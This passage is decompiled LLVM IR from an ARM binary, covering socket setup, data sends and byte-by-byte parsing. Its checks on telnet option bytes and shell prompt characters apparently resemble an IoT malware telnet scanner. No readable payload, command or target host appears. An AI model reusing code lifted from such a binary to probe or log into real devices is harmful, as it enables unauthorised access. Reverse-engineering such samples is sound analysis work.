  %v2_11e10 = inttoptr i32 %v1_11e10 to i32*
  %v3_11e10 = load i32, i32* %v2_11e10, align 4
  store i32 %v3_11e10, i32* %r1.global-to-local, align 4
  %v0_11e14 = load i32, i32* @sb, align 4
  store i32 %v0_11e14, i32* %r0.global-to-local, align 4
  %v4_11e18 = call i32 @function_12da0(i32 %v0_11e14, i32 %v3_11e10, i32 %v3_11e00, i32 %v1_11e0c)
  store i32 %v4_11e18, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_11e24 = call i32 @function_122f8(i32 25)
  store i32 %v1_11e24, i32* %r0.global-to-local, align 4
  %v0_11e28 = load i32, i32* @r7, align 4
  %v2_11e28 = icmp eq i32 %v0_11e28, -1
  store i1 %v2_11e28, i1* %cpsr_c.global-to-local, align 1
  %v7_11e28 = icmp eq i32 %v0_11e28, -1
  store i1 %v7_11e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e28, label %dec_label_pc_1170c.loopexit, label %dec_label_pc_11e30

dec_label_pc_11e30:                               ; preds = %dec_label_pc_11de4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11e30 = icmp eq i32 %v0_11e28, 0
  store i1 %v2_11e30, i1* %cpsr_z.global-to-local, align 1
  %tmp332 = icmp slt i32 %v0_11e28, 1
  br i1 %tmp332, label %dec_label_pc_118a0, label %dec_label_pc_11e38

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e30
  %v0_11e38 = load i32, i32* @r5, align 4
  %v1_11e38 = add i32 %v0_11e38, 21
  %v2_11e38 = inttoptr i32 %v1_11e38 to i8*
  %v3_11e38 = load i8, i8* %v2_11e38, align 1
  %v4_11e38 = zext i8 %v3_11e38 to i32
  store i32 %v4_11e38, i32* %r3.global-to-local, align 4
  %v1_11e3c = add i32 %v0_11e38, 20
  %v2_11e3c = inttoptr i32 %v1_11e3c to i8*
  %v3_11e3c = load i8, i8* %v2_11e3c, align 1
  %v4_11e3c = zext i8 %v3_11e3c to i32
  store i32 %v4_11e3c, i32* %r2.global-to-local, align 4
  %v1_11e40 = add i32 %v0_11e38, 16
  %v2_11e40 = inttoptr i32 %v1_11e40 to i32*
  %v3_11e40 = load i32, i32* %v2_11e40, align 4
  store i32 %v3_11e40, i32* %r1.global-to-local, align 4
  %v4_11e44 = mul nuw nsw i32 %v4_11e38, 256
  %v5_11e44 = or i32 %v4_11e3c, %v4_11e44
  store i32 %v5_11e44, i32* %r2.global-to-local, align 4
  %v1_11e48 = and i32 %v4_11e3c, 128
  %v2_11e48 = icmp ne i32 %v1_11e48, 0
  store i1 %v2_11e48, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_11e38, i32* %r3.global-to-local, align 4
  store i32 %v3_11e40, i32* %stack_var_-48, align 4
  store i32 %v5_11e44, i32* %stack_var_-38, align 4
  %v1_11e58 = inttoptr i32 %v0_11e38 to i32*
  %v2_11e58 = load i32, i32* %v1_11e58, align 4
  store i32 %v2_11e58, i32* @fp, align 4
  %v0_11e5c = call i32 @function_136c8()
  store i32 %v0_11e5c, i32* %r0.global-to-local, align 4
  %v7_11e60 = icmp eq i32 %v0_11e5c, -1
  %.348 = zext i1 %v7_11e60 to i32
  store i32 %.348, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11e6c = icmp eq i32 %v0_11e5c, 0
  store i1 %v2_11e6c, i1* %cpsr_z.global-to-local, align 1
  %tmp335 = icmp slt i32 %v0_11e5c, 1
  br i1 %tmp335, label %bb336, label %.thread68

.thread68:                                        ; preds = %dec_label_pc_11e38
  store i32 1, i32* %sl.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ec4

bb336:                                            ; preds = %dec_label_pc_11e38
  store i32 %.348, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11e78 = icmp eq i1 %v7_11e60, false
  store i1 %v2_11e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e78, label %dec_label_pc_11e80, label %dec_label_pc_11ec4

dec_label_pc_11e80:                               ; preds = %bb336
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11e8c = call i32 @function_13f90(i32 2, i32 1, i32 0)
  store i32 %v3_11e8c, i32* %r0.global-to-local, align 4
  %v2_11e90 = icmp eq i32 %v3_11e8c, -1
  store i1 %v2_11e90, i1* %cpsr_c.global-to-local, align 1
  %v7_11e90 = icmp eq i32 %v3_11e8c, -1
  store i1 %v7_11e90, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_11e8c, i32* @r6, align 4
  br i1 %v7_11e90, label %dec_label_pc_122c4, label %dec_label_pc_11e9c

dec_label_pc_11e9c:                               ; preds = %dec_label_pc_11e80
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_11ea0 = call i32 @function_123b0(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_11ea8 = call i32 @function_123b0(i32 19)
  %v0_11eac = load i32, i32* @sl, align 4
  store i32 %v0_11eac, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_11eb4 = inttoptr i32 %v0_11eac to i32*
  %v3_11eb4 = call i32 @function_122cc(i32 18, i32* %v2_11eb4)
  store i32 %v3_11eb4, i32* %r0.global-to-local, align 4
  %v1_11eb8 = inttoptr i32 %v3_11eb4 to i8*
  %v2_11eb8 = call i32 @function_10144(i8* %v1_11eb8)
  store i32 %v2_11eb8, i32* %r0.global-to-local, align 4
  store i32 %v2_11eb8, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_11ebc = icmp eq i32 %v2_11eb8, 0
  store i1 %v3_11ebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11ebc, label %dec_label_pc_11ec4, label %dec_label_pc_12194

dec_label_pc_11ec4:                               ; preds = %.thread68, %dec_label_pc_11e9c, %bb336
  %v0_11ec4 = load i32, i32* @r5, align 4
  %v1_11ec4 = add i32 %v0_11ec4, 4
  %v2_11ec4 = inttoptr i32 %v1_11ec4 to i32*
  %v3_11ec4 = load i32, i32* %v2_11ec4, align 4
  store i32 %v3_11ec4, i32* %r0.global-to-local, align 4
  %v1_11ec8 = call i32 @function_1369c(i32 %v3_11ec4)
  store i32 %v1_11ec8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_11ed4 = load i32, i32* @r5, align 4
  %v1_11ed4 = add i32 %v0_11ed4, 24
  %v2_11ed4 = inttoptr i32 %v1_11ed4 to i32*
  %v3_11ed4 = load i32, i32* %v2_11ed4, align 4
  store i32 %v3_11ed4, i32* %ip.global-to-local, align 4
  %v2_11ed8 = add i32 %v0_11ed4, 4
  %v3_11ed8 = inttoptr i32 %v2_11ed8 to i32*
  store i32 -1, i32* %v3_11ed8, align 4
  %v0_11edc = load i32, i32* %r2.global-to-local, align 4
  %v1_11edc = load i32, i32* @r5, align 4
  %v2_11edc = add i32 %v1_11edc, 12
  %v3_11edc = inttoptr i32 %v2_11edc to i32*
  store i32 %v0_11edc, i32* %v3_11edc, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11ee0:                               ; preds = %.thread204, %dec_label_pc_11f60, %dec_label_pc_12130, %dec_label_pc_12048, %dec_label_pc_11d54, %dec_label_pc_11ca0, %dec_label_pc_11bec, %dec_label_pc_11b38, %dec_label_pc_11aa0, %dec_label_pc_11a10, %dec_label_pc_118a8, %dec_label_pc_11ec4
  %v0_11ee0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ee0 = load i32, i32* @r7, align 4
  %v2_11ee0 = sub i32 %v0_11ee0, %v1_11ee0
  %v3_11ee0 = icmp uge i32 %v0_11ee0, %v1_11ee0
  store i1 %v3_11ee0, i1* %cpsr_c.global-to-local, align 1
  %v4_11ee0 = xor i32 %v1_11ee0, %v0_11ee0
  %v5_11ee0 = xor i32 %v2_11ee0, %v0_11ee0
  %v6_11ee0 = and i32 %v5_11ee0, %v4_11ee0
  %v7_11ee0 = icmp slt i32 %v6_11ee0, 0
  %v8_11ee0 = icmp slt i32 %v2_11ee0, 0
  %v9_11ee0 = icmp eq i32 %v0_11ee0, %v1_11ee0
  store i1 %v9_11ee0, i1* %cpsr_z.global-to-local, align 1
  %v2_11ee4 = xor i1 %v8_11ee0, %v7_11ee0
  %v0_11ee0.v1_11ee0 = select i1 %v2_11ee4, i32 %v0_11ee0, i32 %v1_11ee0
  store i32 %v0_11ee0.v1_11ee0, i32* %r1.global-to-local, align 4
  %v2_11eec = sub i32 %v0_11ee0, %v0_11ee0.v1_11ee0
  store i32 %v2_11eec, i32* @r2, align 4
  %v1_11ef0 = load i32, i32* @r5, align 4
  %v2_11ef0 = add i32 %v1_11ef0, 24
  %v3_11ef0 = inttoptr i32 %v2_11ef0 to i32*
  store i32 %v2_11eec, i32* %v3_11ef0, align 4
  %v0_11ef4 = load i32, i32* @sb, align 4
  %v1_11ef4 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ef4 = add i32 %v1_11ef4, %v0_11ef4
  store i32 %v2_11ef4, i32* @r1, align 4
  store i32 %v0_11ef4, i32* @r0, align 4
  %v3_11efc = call i32 @function_13cc0(i32 %v0_11ef4, i32 %v2_11ef4, i32 %v2_11eec)
  store i32 %v3_11efc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11790

dec_label_pc_11f04:                               ; preds = %dec_label_pc_11790
  %v1_11f04 = add i32 %v0_11790, 24
  %v2_11f04 = inttoptr i32 %v1_11f04 to i32*
  %v3_11f04 = load i32, i32* %v2_11f04, align 4
  store i32 %v3_11f04, i32* %ip.global-to-local, align 4
  %v1_11f08 = add i32 %v3_11f04, -1
  store i32 %v1_11f08, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11f0c = icmp eq i32 %v1_11f08, 0
  store i1 %v2_11f0c, i1* %cpsr_z.global-to-local, align 1
  %v5_11f10 = icmp sgt i32 %v1_11f08, 0
  br i1 %v5_11f10, label %dec_label_pc_11f38, label %dec_label_pc_11710thread-pre-split.thread

dec_label_pc_11f18:                               ; preds = %bb339
  %v2_11f18 = icmp ugt i8 %v3_11f3c, 35
  store i1 %v2_11f18, i1* %cpsr_c.global-to-local, align 1
  %v7_11f18 = icmp eq i8 %v3_11f3c, 36
  store i1 %v7_11f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f18, label %dec_label_pc_11f4c, label %dec_label_pc_11f20

dec_label_pc_11f20:                               ; preds = %dec_label_pc_11f18
  %v2_11f20 = icmp ugt i8 %v3_11f3c, 34
  store i1 %v2_11f20, i1* %cpsr_c.global-to-local, align 1
  %v7_11f20 = icmp eq i8 %v3_11f3c, 35
  store i1 %v7_11f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f20, label %dec_label_pc_11f4c, label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f20
  %v2_11f28 = icmp ugt i8 %v3_11f3c, 36
  store i1 %v2_11f28, i1* %cpsr_c.global-to-local, align 1
  %v7_11f28 = icmp eq i8 %v3_11f3c, 37
  store i1 %v7_11f28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f28, label %dec_label_pc_11f4c, label %dec_label_pc_11f30

dec_label_pc_11f30:                               ; preds = %dec_label_pc_11f28
  %v1_11f30 = add i32 %v0_11f4c, -1
  store i32 %v1_11f30, i32* %r0.global-to-local, align 4
  %v2_11f30 = icmp ne i32 %v0_11f4c, 0
  store i1 %v2_11f30, i1* %cpsr_c.global-to-local, align 1
  %v7_11f30 = icmp eq i32 %v0_11f4c, 1
  store i1 %v7_11f30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f30, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11f38

dec_label_pc_11f38:                               ; preds = %dec_label_pc_11f04, %dec_label_pc_11f30
  %v0_11f4c = phi i32 [ %v1_11f30, %dec_label_pc_11f30 ], [ %v1_11f08, %dec_label_pc_11f04 ]
  %v2_11f38 = add i32 %v0_11f4c, %v0_11790
  store i32 %v2_11f38, i32* %r3.global-to-local, align 4
  %v1_11f3c = add i32 %v2_11f38, 28
  %v2_11f3c = inttoptr i32 %v1_11f3c to i8*
  %v3_11f3c = load i8, i8* %v2_11f3c, align 1
  %v4_11f3c = zext i8 %v3_11f3c to i32
  store i32 %v4_11f3c, i32* %r3.global-to-local, align 4
  %v2_11f40 = icmp ugt i8 %v3_11f3c, 61
  store i1 %v2_11f40, i1* %cpsr_c.global-to-local, align 1
  %v7_11f40 = icmp eq i8 %v3_11f3c, 62
  store i1 %v7_11f40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f40, label %dec_label_pc_11f4c, label %bb339

bb339:                                            ; preds = %dec_label_pc_11f38
  %v3_11f44 = icmp ugt i8 %v3_11f3c, 57
  store i1 %v3_11f44, i1* %cpsr_c.global-to-local, align 1
  %v8_11f44 = icmp eq i8 %v3_11f3c, 58
  store i1 %v8_11f44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11f44, label %dec_label_pc_11f4c, label %dec_label_pc_11f18

dec_label_pc_11f4c:                               ; preds = %dec_label_pc_11f38, %bb339, %dec_label_pc_11f28, %dec_label_pc_11f20, %dec_label_pc_11f18
  %v1_11f4c = add i32 %v0_11f4c, 1
  store i32 %v1_11f4c, i32* @r7, align 4
  %v2_11f50 = icmp eq i32 %v1_11f4c, -1
  store i1 %v2_11f50, i1* %cpsr_c.global-to-local, align 1
  %v7_11f50 = icmp eq i32 %v0_11f4c, -2
  store i1 %v7_11f50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f50, label %dec_label_pc_11710thread-pre-split, label %dec_label_pc_11f58

dec_label_pc_11f58:                               ; preds = %dec_label_pc_11f4c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11f58 = icmp eq i32 %v1_11f4c, 0
  store i1 %v2_11f58, i1* %cpsr_z.global-to-local, align 1
  %tmp340 = icmp slt i32 %v1_11f4c, 1
  br i1 %tmp340, label %dec_label_pc_118a0, label %dec_label_pc_11f60

dec_label_pc_11f60:                               ; preds = %dec_label_pc_11f58
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11f64 = call i32 @function_123b0(i32 24)
  store i32 %v2_11b44, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_11f74 = call i32 @function_122cc(i32 24, i32* nonnull %stack_var_-56)
  store i32 %v3_11f74, i32* %r0.global-to-local, align 4
  %v3_11f78 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11f78, i32* %r2.global-to-local, align 4
  store i32 %v3_11f74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11f84 = load i32, i32* @r5, align 4
  %v1_11f84 = add i32 %v0_11f84, 4
  %v2_11f84 = inttoptr i32 %v1_11f84 to i32*
  %v3_11f84 = load i32, i32* %v2_11f84, align 4
  store i32 %v3_11f84, i32* %r0.global-to-local, align 4
  %v4_11f88 = inttoptr i32 %v3_11f74 to i32*
  %v5_11f88 = call i32 @function_13f00(i32 %v3_11f84, i32* %v4_11f88, i32 %v3_11f78, i32 16384)
  store i32 %v5_11f88, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11f98 = load i32, i32* @r5, align 4
  %v1_11f98 = add i32 %v0_11f98, 4
  %v2_11f98 = inttoptr i32 %v1_11f98 to i32*
  %v3_11f98 = load i32, i32* %v2_11f98, align 4
  store i32 %v3_11f98, i32* %r0.global-to-local, align 4
  %v5_11f9c = call i32 @function_13f00(i32 %v3_11f98, i32* bitcast ([3 x i8]* @global_var_15f50.34 to i32*), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11fa4 = call i32 @function_122f8(i32 24)
  store i32 %v1_11fa4, i32* %r0.global-to-local, align 4
  %v0_11fa8 = load i32, i32* @r5, align 4
  %v1_11fa8 = add i32 %v0_11fa8, 24
  %v2_11fa8 = inttoptr i32 %v1_11fa8 to i32*
  %v3_11fa8 = load i32, i32* %v2_11fa8, align 4
  store i32 %v3_11fa8, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_11fb0 = add i32 %v0_11fa8, 12
  %v3_11fb0 = inttoptr i32 %v2_11fb0 to i32*
  store i32 10, i32* %v3_11fb0, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_11fb8:                               ; preds = %dec_label_pc_11820
  store i32 ptrtoint (i32* @global_var_16202.332 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_117d8, i32* @r0, align 4
  %v3_11fc4 = call i32 @function_13cb0(i32 %v2_117d8, i32 ptrtoint (i32* @global_var_16202.332 to i32), i32 3)
  store i32 9, i32* @r2, align 4
  store i32 %v2_11fd0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_161f9.334 to i32), i32* @r1, align 4
  %v3_11fd8 = call i32 @function_13cb0(i32 %v2_11fd0, i32 ptrtoint (i32* @global_var_161f9.334 to i32), i32 9)
  store i32 %v3_11fd8, i32* %r0.global-to-local, align 4
  %v0_11fdc = load i32, i32* @r5, align 4
  %v1_11fdc = add i32 %v0_11fdc, 24
  %v2_11fdc = inttoptr i32 %v1_11fdc to i32*
  %v3_11fdc = load i32, i32* %v2_11fdc, align 4
  store i32 %v3_11fdc, i32* %ip.global-to-local, align 4
  %v0_11fe0 = load i32, i32* @r6, align 4
  %v1_11fe0 = add i32 %v0_11fe0, 2
  store i32 %v1_11fe0, i32* %r2.global-to-local, align 4
  %v0_11fe4 = load i32, i32* @sb, align 4
  %v2_11fe4 = add i32 %v0_11fe4, %v3_11fdc
  store i32 %v2_11fe4, i32* %r3.global-to-local, align 4
  %v3_11fe8 = icmp uge i32 %v2_11fe4, %v1_11fe0
  store i1 %v3_11fe8, i1* %cpsr_c.global-to-local, align 1
  %v9_11fe8 = icmp eq i32 %v2_11fe4, %v1_11fe0
  store i1 %v9_11fe8, i1* %cpsr_z.global-to-local, align 1
  %v2_11fec = xor i1 %v3_11fe8, true
  %v3_11fec = or i1 %v9_11fe8, %v2_11fec
  br i1 %v3_11fec, label %dec_label_pc_11fb8.dec_label_pc_11890.loopexit_crit_edge, label %dec_label_pc_11ff0

dec_label_pc_11fb8.dec_label_pc_11890.loopexit_crit_edge: ; preds = %dec_label_pc_11fb8
  %v0_11890.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11890

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_11fb8
  %v0_11ff0 = load i32, i32* @r4, align 4
  %v1_11ff0 = add i32 %v0_11ff0, 1
  %v2_11ff0 = inttoptr i32 %v1_11ff0 to i8*
  %v3_11ff0 = load i8, i8* %v2_11ff0, align 1
  %v4_11ff0 = zext i8 %v3_11ff0 to i32
  store i32 %v4_11ff0, i32* %r3.global-to-local, align 4
  %v2_11ff4 = icmp ugt i8 %v3_11ff0, 30
  store i1 %v2_11ff4, i1* %cpsr_c.global-to-local, align 1
  %v7_11ff4 = icmp eq i8 %v3_11ff0, 31
  store i1 %v7_11ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ff4, label %dec_label_pc_120e4, label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11ff0
  %v1_11ffc = add i32 %v0_11ff0, -1
  %v2_11ffc = inttoptr i32 %v1_11ffc to i8*
  %v3_11ffc = load i8, i8* %v2_11ffc, align 1
  %v4_11ffc = zext i8 %v3_11ffc to i32
  store i32 %v4_11ffc, i32* %r3.global-to-local, align 4
  %v2_12000 = icmp ugt i8 %v3_11ffc, -4
  store i1 %v2_12000, i1* %cpsr_c.global-to-local, align 1
  %v7_12000 = icmp eq i8 %v3_11ffc, -3
  store i1 %v7_12000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12000, label %bb341, label %dec_label_pc_1200c

bb341:                                            ; preds = %dec_label_pc_11ffc
  %v1_12004 = load i32, i32* @r8, align 4
  %v2_12004 = trunc i32 %v1_12004 to i8
  store i8 %v2_12004, i8* %v2_11ffc, align 1
  %v0_12008.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12008.pr, label %dec_label_pc_11834, label %.dec_label_pc_1200c_crit_edge

.dec_label_pc_1200c_crit_edge:                    ; preds = %bb341
  %v0_1200c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1200c

dec_label_pc_1200c:                               ; preds = %.dec_label_pc_1200c_crit_edge, %dec_label_pc_11ffc
  %v0_1200c = phi i32 [ %v0_1200c.pre, %.dec_label_pc_1200c_crit_edge ], [ %v4_11ffc, %dec_label_pc_11ffc ]
  %v2_1200c = icmp ugt i32 %v0_1200c, 250
  store i1 %v2_1200c, i1* %cpsr_c.global-to-local, align 1
  %v7_1200c = icmp eq i32 %v0_1200c, 251
  store i1 %v7_1200c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1200c, label %bb342, label %dec_label_pc_11834

bb342:                                            ; preds = %dec_label_pc_1200c
  %v1_12010 = load i32, i32* %sl.global-to-local, align 4
  %v2_12010 = trunc i32 %v1_12010 to i8
  %v3_12010 = load i32, i32* @r4, align 4
  %v4_12010 = add i32 %v3_12010, -1
  %v5_12010 = inttoptr i32 %v4_12010 to i8*
  store i8 %v2_12010, i8* %v5_12010, align 1
  br label %dec_label_pc_11834

dec_label_pc_12018:                               ; preds = %dec_label_pc_11dac
  store i32 %v1_11de8, i32* %r0.global-to-local, align 4
  %v0_12020 = load i32, i32* @r5, align 4
  %v1_12020 = add i32 %v0_12020, 4
  %v2_12020 = inttoptr i32 %v1_12020 to i32*
  %v3_12020 = load i32, i32* %v2_12020, align 4
  store i32 %v3_12020, i32* %r0.global-to-local, align 4
  %v1_12024 = call i32 @function_1369c(i32 %v3_12020)
  store i32 %v1_12024, i32* %r0.global-to-local, align 4
  %v0_12028 = load i32, i32* @r5, align 4
  %v1_12028 = add i32 %v0_12028, 284
  %v2_12028 = inttoptr i32 %v1_12028 to i8*
  %v3_12028 = load i8, i8* %v2_12028, align 1
  %v4_12028 = zext i8 %v3_12028 to i32
  %v1_1202c = add nuw nsw i32 %v4_12028, 1
  %v1_12030 = urem i32 %v1_1202c, 256
  store i32 %v1_12030, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_12038 = icmp ugt i32 %v1_12030, 9
  store i1 %v2_12038, i1* %cpsr_c.global-to-local, align 1
  %v7_12038 = icmp eq i32 %v1_12030, 10
  store i1 %v7_12038, i1* %cpsr_z.global-to-local, align 1
  %v2_1203c = add i32 %v0_12028, 4
  %v3_1203c = inttoptr i32 %v2_1203c to i32*
  store i32 -1, i32* %v3_1203c, align 4
  %v0_12040 = load i32, i32* %r3.global-to-local, align 4
  %v1_12040 = trunc i32 %v0_12040 to i8
  %v2_12040 = load i32, i32* @r5, align 4
  %v3_12040 = add i32 %v2_12040, 284
  %v4_12040 = inttoptr i32 %v3_12040 to i8*
  store i8 %v1_12040, i8* %v4_12040, align 1
  %v0_12044 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12048 = load i32, i32* @r5, align 4
  br i1 %v0_12044, label %dec_label_pc_12048, label %dec_label_pc_12130

dec_label_pc_12048:                               ; preds = %dec_label_pc_12018
  %v1_12048 = add i32 %v0_12048, 24
  %v2_12048 = inttoptr i32 %v1_12048 to i32*
  %v3_12048 = load i32, i32* %v2_12048, align 4
  store i32 %v3_12048, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v3_12058 = add i32 %v0_12048, 284
  %v4_12058 = inttoptr i32 %v3_12058 to i8*
  store i8 0, i8* %v4_12058, align 1
  %v0_1205c = load i32, i32* %r1.global-to-local, align 4
  %v1_1205c = load i32, i32* @r5, align 4
  %v2_1205c = add i32 %v1_1205c, 12
  %v3_1205c = inttoptr i32 %v2_1205c to i32*
  store i32 %v0_1205c, i32* %v3_1205c, align 4
  br label %dec_label_pc_11ee0

dec_label_pc_12064:                               ; preds = %dec_label_pc_11728
  br i1 %v2_11750, label %dec_label_pc_12184, label %dec_label_pc_12068

dec_label_pc_12068:                               ; preds = %dec_label_pc_12064
  %v3_12068 = icmp eq i32 %v5_1174c, -1
  store i1 %v3_12068, i1* %cpsr_c.global-to-local, align 1
  %v8_12068 = icmp eq i32 %v5_1174c, -1
  store i1 %v8_12068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12068, label %dec_label_pc_12070, label %dec_label_pc_11778

dec_label_pc_12070:                               ; preds = %dec_label_pc_12068
  store i32 %stack_var_-1868.0, i32* %r2.global-to-local, align 4
  %v2_12074 = load i32, i32* %v2_11730, align 4
  store i32 %v2_12074, i32* %r3.global-to-local, align 4
  %v2_12078 = icmp ugt i32 %v2_12074, 10
  store i1 %v2_12078, i1* %cpsr_c.global-to-local, align 1
  %v7_12078 = icmp eq i32 %v2_12074, 11
  store i1 %v7_12078, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12078, label %dec_label_pc_115a8, label %dec_label_pc_12080

dec_label_pc_12080:                               ; preds = %dec_label_pc_12070, %dec_label_pc_12184
  %v0_12080 = load i32, i32* @r5, align 4
  %v1_12080 = add i32 %v0_12080, 4
  %v2_12080 = inttoptr i32 %v1_12080 to i32*
  %v3_12080 = load i32, i32* %v2_12080, align 4
  store i32 %v3_12080, i32* %r0.global-to-local, align 4
  %v1_12084 = call i32 @function_1369c(i32 %v3_12080)
  store i32 %v1_12084, i32* %r0.global-to-local, align 4
  %v0_12088 = load i32, i32* @r5, align 4
  %v1_12088 = add i32 %v0_12088, 284
  %v2_12088 = inttoptr i32 %v1_12088 to i8*
  %v3_12088 = load i8, i8* %v2_12088, align 1
  %v4_12088 = zext i8 %v3_12088 to i32
  %v1_1208c = add nuw nsw i32 %v4_12088, 1
  %v1_12090 = urem i32 %v1_1208c, 256
  store i32 %v1_12090, i32* %r3.global-to-local, align 4
  %v2_12094 = icmp ugt i32 %v1_12090, 8
  store i1 %v2_12094, i1* %cpsr_c.global-to-local, align 1
  %v7_12094 = icmp eq i32 %v1_12090, 9
  store i1 %v7_12094, i1* %cpsr_z.global-to-local, align 1
  %v1_12098 = trunc i32 %v1_1208c to i8
  store i8 %v1_12098, i8* %v2_12088, align 1
  store i32 -1, i32* @r4, align 4
  %v0_120a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_120a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_120a0 = xor i1 %v1_120a0, true
  %v3_120a0 = and i1 %v0_120a0, %v2_120a0
  br i1 %v3_120a0, label %bb343, label %.thread217

.thread217:                                       ; preds = %dec_label_pc_12080
  %v1_120a4213218 = load i32, i32* @r5, align 4
  %v2_120a4214219 = add i32 %v1_120a4213218, 4
  %v3_120a4215220 = inttoptr i32 %v2_120a4214219 to i32*
  store i32 -1, i32* %v3_120a4215220, align 4
  br label %bb344

bb343:                                            ; preds = %dec_label_pc_12080
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_120a4209 = load i32, i32* @r5, align 4
  %v2_120a4210 = add i32 %v1_120a4209, 4
  %v3_120a4211 = inttoptr i32 %v2_120a4210 to i32*
  store i32 -1, i32* %v3_120a4211, align 4
  %v4_120a8 = load i32, i32* %r3.global-to-local, align 4
  %v5_120a8 = load i32, i32* @r5, align 4
  %v6_120a8 = add i32 %v5_120a8, 12
  %v7_120a8 = inttoptr i32 %v6_120a8 to i32*
  store i32 %v4_120a8, i32* %v7_120a8, align 4
  %v4_120ac = load i32, i32* %r3.global-to-local, align 4
  %v5_120ac = trunc i32 %v4_120ac to i8
  %v6_120ac = load i32, i32* @r5, align 4
  %v7_120ac = add i32 %v6_120ac, 284
  %v8_120ac = inttoptr i32 %v7_120ac to i8*
  store i8 %v5_120ac, i8* %v8_120ac, align 1
  %v0_120b0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_120b0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb344

bb344:                                            ; preds = %.thread217, %bb343
  %v1_120b0 = phi i1 [ %v1_120b0.pre, %bb343 ], [ %v1_120a0, %.thread217 ]
  %v0_120b0 = phi i1 [ %v0_120b0.pre, %bb343 ], [ %v0_120a0, %.thread217 ]
  %v2_120b0 = xor i1 %v1_120b0, true
  %v3_120b0 = and i1 %v0_120b0, %v2_120b0
  br i1 %v3_120b0, label %dec_label_pc_115a8, label %dec_label_pc_120b4

dec_label_pc_120b4:                               ; preds = %bb344
  %v0_120b4 = load i32, i32* @r5, align 4
  store i32 %v0_120b4, i32* @r0, align 4
  %v0_120b8 = call i32 @function_106a4()
  store i32 %v0_120b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_115a8

dec_label_pc_120c0:                               ; preds = %dec_label_pc_11a70, %dec_label_pc_11a4c, %dec_label_pc_11a8c
  store i32 %v3_11a4c, i32* %r1.global-to-local, align 4
  %v0_120c4 = load i32, i32* @sb, align 4
  store i32 %v0_120c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_161ec.336 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
